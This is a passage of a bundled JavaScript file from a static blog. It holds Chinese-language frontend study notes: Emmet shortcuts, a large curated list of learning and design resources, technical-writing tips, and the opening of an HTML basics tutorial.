attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item5<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item6<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>item7<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"文本：\">文本：<code>{}</code></h3>\n<ul>\n<li><code>a[#]{Click me}</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Click me<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre><h3 id=\"lorem-ipsum亂數假文：lorem\">Lorem Ipsum(亂數假文)：<code>lorem</code></h3>\n<ul>\n<li><code>lorem</code> ⟹</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\">Lorem ipsum dolor sit amet, consectetur adipisicing elit. Similique impedit\nquaeiure</code></pre><h2 id=\"emmet-的-css-支持\">Emmet 的 css 支持</h2>\n<h3 id=\"css-屬性\">css 屬性</h3>\n<p><code>m</code> ⟹ <code>margin:</code>\n<code>fz</code> ⟹ <code>font-size:</code></p>\n<h3 id=\"屬性值\">屬性值</h3>\n<p><code>m10</code> ⟹ <code>margin: 10px;</code>\n<code>mt10</code> ⟹ <code>margin-top: 10px;</code></p>\n<h3 id=\"多個屬性值\">多個屬性值</h3>\n<p>對於有多個屬性值的 CSS 屬性，在編寫時只需在屬性值之間添加-：</p>\n<p><code>m4-6</code> ⟹ <code>margin: 4px 6px;</code></p>\n<h3 id=\"單位\">單位</h3>\n<p>Emmet 默認單位為<code>px</code>，其他單位如下</p>\n<p><code>p</code> → <code>%</code>\n<code>e</code> → <code>em</code>\n<code>r</code>→ <code>rem</code>\n<code>x</code> → <code>ex</code>\n<code>w100p</code> ⟹ <code>width: 100%</code>\n<code>m10p30e5x</code> ⟹ <code>margin: 10% 30em 5ex</code></p>\n","date":"2019-07-21T13:47:08.000Z","excerpt":"","printDate":"July 21, 2019","printReadingTime":"2 min read"};

var route_60 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod49
});

var Mod50 = {"title":"前端筆記 (0) 總整理","slug":"f2e-00-summary","html":"<p>整理網路上的前端相關資源。</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/j5c8k6m8/items/a59b7cc09ba81fd8a62f\">【短期】Qiita の読んでおかなければいけない記事 100 選【毎日自動更新】- Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/j5c8k6m8/items/942c158db873f4a0eb12\">【長期】Qiita の読んでおかなければいけない記事 100 選【毎日自動更新】- Qiita</a></li>\n</ul>\n<h2 id=\"入門\">入門</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/hulis-blog/frontend-engineer-guide-297821512f4e\">零基礎的小明要如何成為前端工程師？</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/goodjack/developer-roadmap-chinese\">成為 Web 開發人員的路線圖</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://idoc.hexschool.com/tobef2e/chapter1.html\">前端工程師養成手冊</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://quip.com/D59vAxcgG8Qc\">邁向前端工程師之路！</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/teradonburi/items/43c52d7cffc318e9b1e9\">【保存版】Web フロントエンド基礎力 ( 初心者向け )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://docs.google.com/document/d/13nK_XY9u5uIleTpSCw88lMupzgCSwXd6j6je44eLhMQ/edit\">前端資源懶人包</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.google.com/web/fundamentals/\">Web Fundamentals</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/suzu-4/items/ea5d802cb0ad16682ae2\">すべての新米フロントエンドエンジニアに読んでほしい 50 の資料</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mazgi/items/30d77099445288af0bda\">最短で Web 業界で給与を得るための最小知識 2020</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/tgsmsk/items/5bc9a2a5fd2d4cb155c2\">新人 Web プログラマの学習が捗るリンク集 - Qiita</a></li>\n</ul>\n<h3 id=\"練習資源\">練習資源</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>內容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/aszx87410/frontend-intermediate-course\">從新手到中手：前端工程加強班</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Lidemy/mentor-program-2nd\">Lidemy 程式導師實驗計畫第二期</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Lidemy/mentor-program-3rd\">Lidemy 程式導師實驗計畫第三期</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/Lidemy/mentor-program-4th\">Lidemy 程式導師實驗計畫第四期</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chupai.github.io/Hex-Restaurant/\">六角大漢堡</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chupainotebook.blogspot.com/2019/05/blog-post.html\">六角西餐廳</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://chupainotebook.blogspot.com/2019/05/blog-post_24.html\">甜點電商</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.hexschool.com/2018/05/09/2018-05-09-the_f2e/\">The F2E - 前端修練精神時光屋</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.facebook.com/groups/173311386703334/permalink/201194263915046/\">支線任務 - 颱風防災平台</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.facebook.com/groups/110635703123103/\">CSS 切版、JS 開發練功題目</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/baby-degu/items/f905c8ee972cf46ce11b\">トップデベロッパーになるために作成したいアプリ 8 選</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Dragon-taro/items/03f322dee15b19c33613\">2020 年に Web フロントエンドを勉強する人が作るべきたったひとつのアプリ</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/rana_kualu/items/915345b8f3f870cfe2aa\">2020 年のフロントエンドマスターになりたければこの 9 プロジェクトを作れ</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/baby-degu/items/df70cccf686ad9fe4940\">2020 年にフロントエンド開発者が作りたい 9 つのプロジェクト - Qiita</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/wesbos/JavaScript30\">JavaScript 30</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/@chupai/BkXngSU-B/\">竹白記事本 Javascript30 紀錄</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://pjchender.blogspot.com/2017/06/js30.html\">JS30 學習筆記連結目錄</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://100dayscss.com/\">100 Days CSS Challenge</a></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"互動遊戲\">互動遊戲</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>內容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://flukeout.github.io/\">CSS Dinner</a></td>\n<td>CSS 選取器</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://flexboxfroggy.com/\">Flexbox Foroggy</a></td>\n<td>Flexbox</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.flexboxdefense.com\">Flexbox Defense</a></td>\n<td>Flexbox</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://w3c.hexschool.com/flexbox/cc1c1b71\">Flex Pirate</a></td>\n<td>Flexbox</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://cssgridgarden.com/#zh-tw\">Grid Garden</a></td>\n<td>Grid</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://js-pop-quiz.now.sh/#/\">JavaScript Pop Quiz</a></td>\n<td>JavaScript 題目測驗</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://alexnisnevich.github.io/untrusted/\">Untrusted</a></td>\n<td>使用 JavaScript 過關的解謎遊戲</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://play.elevatorsaga.com/\">Elevator Saga</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.rxjs-fruits.com/subscribe\">rxjs-fruits.com - A game for learning RxJS</a></td>\n<td>Rxjs Operator</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/goldbergyoni/nodebestpractices\">nodebestpractices</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://mentor-program.co/huli/game/index.php\">綜合能力測驗 ( PHP, Javascript, HTML, CSS )</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://r30challenge.herokuapp.com/\">異世界？r3:0 挑戰</a></td>\n<td></td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.hackthebox.eu/\">Hack The Box</a></td>\n<td>滲透測試</td>\n</tr>\n</tbody></table>\n<h3 id=\"如何撰寫技術文章\">如何撰寫技術文章</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://developers.google.com/tech-writing\">Technical Writing | Google Developers</a></li>\n</ul>\n<h4 id=\"one\">One</h4>\n<ul>\n<li>保持文章內用語的一貫性</li>\n<li>避免使用曖昧的名詞</li>\n<li>避免使用被動語態，優先使用主動語態</li>\n<li>選擇意義明確的動詞</li>\n<li>選擇意義更為精確的動詞</li>\n<li>一篇文章只表達單一訊息</li>\n<li>長文轉換成清單形式</li>\n<li>排除多餘的文字</li>\n<li>順序重要時使用有序清單，順序不重要時使用無序清單</li>\n<li>使用清單時應維持用語的對應性</li>\n<li>使用有序清單時以命令語態開頭</li>\n<li>適切地區別使用清單與表格</li>\n<li>將段落的精瓍濃縮於開頭</li>\n<li>一個段落只談論一個話題</li>\n<li>定義讀者的前提知識</li>\n<li>撰寫時意識讀者的存在</li>\n<li>在文件的開頭明確表達該文件的重點</li>\n</ul>\n<h4 id=\"two\">Two</h4>\n<ul>\n<li>採用撰寫風格規範（樣板）</li>\n<li>設身處地讀者的想法</li>\n<li>實際發聲閱讀自己的文章</li>\n<li>寫好草稿後放置一段時間再重看一次</li>\n<li>找出優秀的評論者</li>\n<li>先作好文件的排版，或是自由寫完後進行整理</li>\n<li>在開頭先揭示該文件的適用範圍與前提條件</li>\n<li>不要一口氣丟出所有的資訊，而是將新的概念或指示逐階地丟出</li>\n<li>製作圖片前先寫好說明文字</li>\n<li>限制圖片內的資訊量</li>\n<li>使用重點說明文字，或是加入引人注意的符號，將讀者的注意力引導至圖片的重點處</li>\n<li>撰寫容易理解的簡潔範例程式碼</li>\n<li>盡可能保持程式碼的註解精簡，但比起簡潔性更應優先於明確易懂</li>\n<li>不替十分明確的程式碼撰寫註解</li>\n<li>註解應集中於說明程式碼內較不直覺的部份</li>\n<li>除了好的例子，也提供不好的例子</li>\n<li>提供各種複雜度的範例程式碼</li>\n<li>持續重新審視內容</li>\n<li>因應使用者提供不同的資料形態</li>\n<li>和讀者已經相當熟悉的東西作比較</li>\n<li>在教學裡使用複數個例子降低理解難度</li>\n<li>在教學裡明確指出讀者容易犯錯的地方</li>\n</ul>\n<h2 id=\"設計\">設計</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://intersection.tw/%E4%BD%BF%E7%94%A8%E8%80%85%E4%BB%8B%E9%9D%A2%E7%9A%84%E8%A6%96%E8%A6%BA%E6%95%88%E6%87%89-%E7%B5%A6%E7%9C%9F%E6%AD%A3%E7%9A%84%E7%8B%82%E7%86%B1%E4%BB%BD%E5%AD%90-54ee84d365de\">使用者介面的視覺效應</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://intersection.tw/%E5%88%A9%E7%94%A8%E5%8B%95%E7%95%AB%E5%89%B5%E9%80%A0%E6%98%93%E7%94%A8%E6%80%A7-%E5%8B%95%E7%95%AB%E7%9A%84-ux-%E5%AE%A3%E8%A8%80-20b6c6475682\">利用動畫創造易用性：動畫的 UX 規範</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/uxeastmeetswest/ux%E4%B9%8B%E5%8B%95%E7%95%AB%E8%A8%AD%E8%A8%88%E5%B0%8F%E6%92%87%E6%AD%A5-f39d23368c89\">UX 之動畫設計小撇步</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/baby-degu/items/c3fc3b038e937112d999\">【2019 年版】UI と UX デザイントレンド</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/megumu-u/items/b991798842f7713a9ed8\">わかりやすいデザインを考える</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kanchan-1996/items/f528bffbaccfe325032c\">設計って何するの？( UI 設計とか )</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/teradonburi/items/412f65147525ff34dbbd\">ノンデザイナーでもイケてる LP を作成する方法</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/rana_kualu/items/6955a2e4bc3284c361a5\">非デザイナーのための Web デザイン開発ガイド - デザインは感性ではない、スキルだ - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/megumu-u/items/73b728ad1d381717d731\">画面をデザインするということ - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/mark_1975M/items/eabdd95ac1de64e4fe1b\">モバイルアプリにおける UI デザイン - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/kahirokunn/items/d872b343ea1b89e8bec8\">「設計なんて不要でしょ」について - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@shingohagiwara/%E4%BC%9D%E8%AA%AC%E3%81%AE%E3%83%87%E3%82%A3%E3%82%BA%E3%83%8B%E3%83%BC%E3%82%A2%E3%83%8B%E3%83%A1%E3%83%BC%E3%82%BF%E3%83%BC%E3%81%8B%E3%82%89%E5%AD%A6%E3%81%B6-ux%E3%82%92%E5%90%91%E4%B8%8A%E3%81%95%E3%81%9B%E3%82%8B5%E3%81%A4%E3%81%AE%E3%82%A2%E3%83%8B%E3%83%A1%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3-sxsw-2015-ux%E3%83%AC%E3%83%9D%E3%83%BC%E3%83%88-51a73e7acd5d\">伝説のディズニーアニメーターから学ぶ、UX を向上させる 5 つのアニメーション/ SXSW 2015 UX レポート</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@52shinNaka/ui%E3%83%87%E3%82%B6%E3%82%A4%E3%83%8A%E3%81%8C%E3%83%9E%E3%82%A4%E3%82%AF%E3%83%AD%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%A9%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E4%B8%8A%E9%81%94%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AE%E3%83%99%E3%82%B9%E3%83%88%E3%83%97%E3%83%A9%E3%82%AF%E3%83%86%E3%82%A3%E3%82%B9-735c2205e44d\">UI デザイナがマイクロインタラクション上達するためのベストプラクティス - なかじー - Medium</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/as-a-product-designer/%E5%85%88%E5%88%A5%E6%80%A5%E8%91%97%E7%95%ABui-%E4%BD%A0%E8%81%BD%E9%81%8Eflow-chart%E5%97%8E-c6715f055cfc\">先別急著畫 UI，你聽過 Flow Chart 嗎</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/uxabc/make-ui-mockup-with-keynote-71e4cdbab8f\">免用 Photoshop, 30 秒用 Keynote 做出漂亮的 UI 展示模擬圖</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/@realdennis/%E9%81%BF%E5%85%8D-layout-%E5%B8%B6%E4%BE%86%E7%9A%84%E7%97%9B-%E8%AD%AF-9c8c6f7d56bf\">避免 Layout 帶來的痛 #譯</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/%E5%A5%B3%E4%BA%BA%E8%BF%B7%E8%A8%AD%E8%A8%88%E5%AF%A6%E9%A9%97%E5%AE%A4-womany-phd-lab/6bestuiuxpublications-307e9b530f3e\">Medium 上有哪些值得追蹤的 UI/UX 設計資源？</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/as-a-product-designer/%E4%BD%A0%E7%B5%A6%E6%88%91%E7%BF%BB%E8%AD%AF%E7%BF%BB%E8%AD%AF-%E4%BB%80%E9%BA%BC%E5%8F%AB%E7%94%A8-adobe-xd-%E8%A8%AD%E8%A8%88%E5%A4%9A%E5%9C%8B%E8%AA%9E%E7%B3%BB%E7%B6%B2%E7%AB%99-b54d0344e428\">你給我翻譯翻譯，什麼叫用 Adobe Xd 設計多國語系網站</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/monospace-tw/2018%E5%B9%B4%E6%9B%B8%E6%AB%83%E4%B8%8A%E8%A9%B2%E6%9C%89%E7%9A%84-ux-%E6%96%B0%E6%89%8B%E8%A8%AD%E8%A8%88%E6%8E%A8%E8%96%A6%E6%9B%B8%E5%96%AE-9e81f0001422\">2018 年書櫃上該有的新手 UX 設計推薦書單</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/monospace-tw/%E5%9C%96%E8%A7%A3%E9%AB%98%E6%89%8B%E9%83%BD%E5%9C%A8%E7%94%A8%E7%9A%84-adobe-xd-%E5%BF%AB%E6%8D%B7%E9%8D%B5%E5%AE%8C%E6%95%B4%E7%89%88-d5f7b32270\">圖解高手都在用的 Adobe Xd 快捷鍵完整版</a></li>\n</ul>\n<h3 id=\"product-requirements-docs--prd-\">Product Requirements Docs ( PRD )</h3>\n<ul>\n<li>What is the feature trying to archieve?</li>\n<li>Details of how the feature should work.</li>\n<li>Vision</li>\n<li>Background research</li>\n<li>Goals &amp; Non-goals</li>\n<li>Metrics</li>\n<li>High-Level use cases</li>\n<li>Detailed design</li>\n<li>Launch plan</li>\n<li>Risks</li>\n<li>Privacy</li>\n<li>Legal</li>\n</ul>\n<h3 id=\"如何做出有趣的網頁\">如何做出有趣的網頁</h3>\n<ul>\n<li>Top Down（從它處獲取靈感 → 轉換為網頁）</li>\n<li>Bottom Up（擁有什麼技術 → 可以做什麼）</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://note.com/harahiroshi/n/n3af079dc17e9\">レイアウトデザインの視点を増やす 思考＆Tips ｜ハラ ヒロシ｜ note</a></li>\n</ul>\n<h4 id=\"目的與需求，訪談提案\">目的與需求，訪談提案</h4>\n<ul>\n<li>主要目標</li>\n<li>客群</li>\n<li>潛力</li>\n</ul>\n<h4 id=\"定義問題，找到解決方案\">定義問題，找到解決方案</h4>\n<ul>\n<li>業主需求</li>\n<li>時程需求</li>\n<li>客群屬性</li>\n<li>關鍵字</li>\n<li>可用素材</li>\n<li>呈現需求</li>\n</ul>\n<h4 id=\"網頁結構與內容-ux-規劃\">網頁結構與內容 UX 規劃</h4>\n<ul>\n<li>網頁結構規劃（xmind）</li>\n<li>網頁內容功能規劃（文書軟體）</li>\n<li>線框稿製作（Sketch／Illustrator）</li>\n<li>製作互動原型（Invision）</li>\n</ul>\n<h4 id=\"設計時的重點\">設計時的重點</h4>\n<ul>\n<li>避免版面自動撐滿</li>\n<li>擺脫流式佈局</li>\n<li>製造破格感</li>\n<li>Brainsotrming\n<br>提出任何想到的關鍵字與延伸</li>\n<li>製作 Moodboard\n<br>拼湊感受網頁的視覺風格</li>\n<li>字型與色彩規劃</li>\n<li>Styleframe 風格</li>\n<li>UI 風格</li>\n<li>手機版頁面調整\n<br>除了流式排版：\n<br>1. 使用按鈕或替換內容\n<br>2. 適當地隱藏區塊\n<br>3. 重新佈局版面</li>\n</ul>\n<h4 id=\"幾個視覺設計訣竅\">幾個視覺設計訣竅</h4>\n<ul>\n<li>對比</li>\n<li>重複</li>\n<li>韻律</li>\n<li>分群</li>\n<li>層級</li>\n</ul>\n<h4 id=\"意識隱藏線\">意識隱藏線</h4>\n<h4 id=\"調整群組間隔\">調整群組間隔</h4>\n<h3 id=\"靈感\">靈感</h3>\n<table>\n<thead>\n<tr>\n<th>名稱</th>\n<th>內容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.pinterest.com/\">Pinterest</a></td>\n<td>以圖像內容為主的社群網站</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://dribbble.com/\">dribbble</a></td>\n<td>以設計面向為主的社群網站</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.awwwards.com/\">awwward</a></td>\n<td>網頁設計領域的競賽平台</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://muz.li/\">Muzli</a></td>\n<td>切換 Chrome 新分頁成為設計相關主題用的插件</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://experiments.withgoogle.com/collection/chrome\">Chrome Experiments</a></td>\n<td>為了推廣 Chrome 用的展示網站</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://experiments.p5aholic.me/\">Web Graphics Experiments</a></td>\n<td>由 KEITA YAMADA 製作的展示網站</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://a.singlediv.com/\">A Single Div</a></td>\n<td>由 Lynn Fisher 製作只用一個 DIV 與 CSS 繪製圖像的展示網站</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://yui540.graphics/#/\">臆病な魔女 Yui540</a></td>\n<td>由 Yui540 製作的展示網站</td>\n</tr>\n<tr>\n<td><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/yui540/Yozora_No_Okurimono\">夜空ノ贈リ物 - Github</a></td>\n<td>由 Yui540 撰寫的解說文章</td>\n</tr>\n</tbody></table>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ideo.com/blog/use-these-dummy-numbers-when-prototyping-with-data\">Use These &#39;Dummy Numbers&#39; When Prototyping With Data | ideo.com</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blockstudio.tw/blog/webdesign-inspiration-for-blockstudio/\">你都去哪裡找網站動態特效設計靈感？(網站設計篇) | 版塊設計 Block Studio</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://flipermag.com/2015/06/09/designer-5/\">從靈感發想到效率提升，學設計必知的 30 個「免費設計資源」</a></li>\n</ul>\n<h2 id=\"note\">Note</h2>\n<ul>\n<li><code>example.com</code> 或 <code>example.net</code>、<code>example.org</code>、<code>example.edu</code> 都是根據 RFC 2606 第 3 部份保留的二級域名，無法被任何單位註冊使用，因此適合在開發測試時使用。</li>\n<li>其它的保留域名 (TLD) 還有 <code>.text</code>、<code>.example</code>、<code>.invalid</code>、<code>.localhost</code><ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.jxck.io/entries/2017-09-27/example-local-test-domains.html\">予約済みドメイン (.example, .localhost, .test) について | blog.jxck.io</a></li>\n</ul>\n</li>\n<li>可以使用 <a target=\"_blank\" rel=\"nofollow\" href=\"js.new\">js.new</a> 或 <a target=\"_blank\" rel=\"nofollow\" href=\"vue.new\">vue.new</a>、<a target=\"_blank\" rel=\"nofollow\" href=\"ts.new\">ts.new</a> 網域快速開啟沙盒</li>\n</ul>\n","date":"2019-07-18T07:05:01.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"4 min read"};

var route_54 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod50
});

var Mod51 = {"title":"前端筆記 (1) HTML","slug":"f2e-01-html","html":"<h2 id=\"what-is-html？\">What is HTML？</h2>\n<p>HTML（HyperText Markup Language）是撰寫網頁結構用的標記語言，「標記語言」的意思是，它是直接將特定寫法轉換成對應架構，HTML 便是將許多不同標籤（ex. <code>&lt;tag&gt; ... &lt;/tag&gt;</code>）轉換成瀏覽器上的內容架構和元素。</p>\n<h2 id=\"html-的四大基本結構\">HTML 的四大基本結構</h2>\n<p>一份基礎的 HTML 文件大概長得像是：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token comment\">&lt;!-- head content here --></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token comment\">&lt;!-- content here --></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre><p>這裡包含了 HTML 的四大基本結構：</p>\n<ol>\n<li><code>&lt;!DOCTYPE html&gt;</code></li>\n<li><code>&lt;html&gt;</code></li>\n<li><code>&lt;head&gt;</code></li>\n<li><code>&lt;body&gt;</code></li>\n</ol>\n<h3 id=\"1-doctype-html\">1. <code>&lt;!DOCTYPE html&gt;</code></h3>\n<ul>\n<li>宣告這是一份使用 HTML5 語法標準的文件</li>\n<li>必須位於文件的第一行</li>\n<li>前方不可有空格與空行</li>\n</ul>\n<h3 id=\"2-html\">2. <code>&lt;html&gt;</code></h3>\n<ul>\n<li>文件正文開始的標記</li>\n<li>HTML 文件檔案的 ROOT（根元素）</li>\n<li>其他元素都會是此元素的後代</li>\n<li>可使用 <code>lang=代碼縮寫</code> 屬性標註此網頁所使用的語言（IETF 語言標籤）</li>\n<li>繁體中文的網頁通常使用 <code>&lt;html lang=&quot;zh-TW&quot;&gt;</code> 或是 <code>&lt;html lang=&quot;zh-Hant&quot;&gt;</code></li>\n</ul>\n<h3 id=\"3-head\">3. <code>&lt;head&gt;</code></h3>\n<ul>\n<li>規範與網頁相關資訊（metadata）的區域</li>\n<li>可設置如 <code>&lt;meta&gt;</code> , <code>&lt;base&gt;</code> , <code>&lt;title&gt;</code> , 